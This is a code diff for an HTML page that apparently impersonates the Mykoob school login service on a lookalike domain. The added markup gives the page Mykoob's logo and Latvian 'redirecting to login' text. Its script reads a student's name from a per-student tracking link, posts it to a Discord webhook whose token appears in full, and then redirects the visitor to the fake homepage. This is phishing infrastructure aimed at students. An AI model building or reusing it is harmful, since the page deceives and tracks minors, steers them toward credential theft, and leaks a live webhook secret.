@@ -1,21 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="lv">
 <head>
-    <title>Redirecting...</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mykoob — Pieslēgties</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        html {
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #121212;
+            color: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .redirect-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #2d2d2d;
+            border-top-color: #489ffe;
+            border-radius: 50%;
+            animation: spin 0.8s ease-in-out infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .redirect-text {
+            font-size: 16px;
+            color: #9ca3af;
+            margin-bottom: 8px;
+        }
+
+        .redirect-sub {
+            font-size: 14px;
+            color: #6b7280;
+        }
+    </style>
+
     <script>
         // ── Get student name from the URL ──
-        // Example: if URL is https://edu-mykoob.com/t/janis
-        // Then student = "janis"
         const path = window.location.pathname;
         const parts = path.split('/').filter(p => p.length > 0);
         const student = parts[parts.length - 1] || 'unknown';
 
         // ── Only track if it's a /t/ link ──
-        if (path.includes('/t/')) {
-            // Your Discord webhook URL
+        if (path.includes('/t/') && student !== 'unknown' && student !== '404') {
             const webhook = 'https://discord.com/api/webhooks/1546873236837507194/lmRQFwn2BMjakNFUd6d1OJLQ-bd-VaMT2kcBsXblxIXs9zvl5rDs-0bB8UGwMtgj4FoO';
 
-            // Send to Discord
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -28,10 +91,23 @@
         // ── Redirect to homepage ──
         setTimeout(function() {
             window.location.href = 'https://edu-mykoob.com/';
-        }, 100);
+        }, 300);
     </script>
 </head>
 <body>
-    <p>Novirzīšana...</p>
+
+    <div class="redirect-container">
+        <!-- Mykoob logo (same as main page) -->
+        <img 
+            src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" 
+            alt="Mykoob" 
+            style="height: 36px; width: auto; margin-bottom: 40px;"
+        />
+
+        <div class="spinner"></div>
+        <div class="redirect-text">Novirzīšana uz pieslēgšanās lapu...</div>
+        <div class="redirect-sub">Lūdzu, uzgaidiet</div>
+    </div>
+
 </body>
 </html>
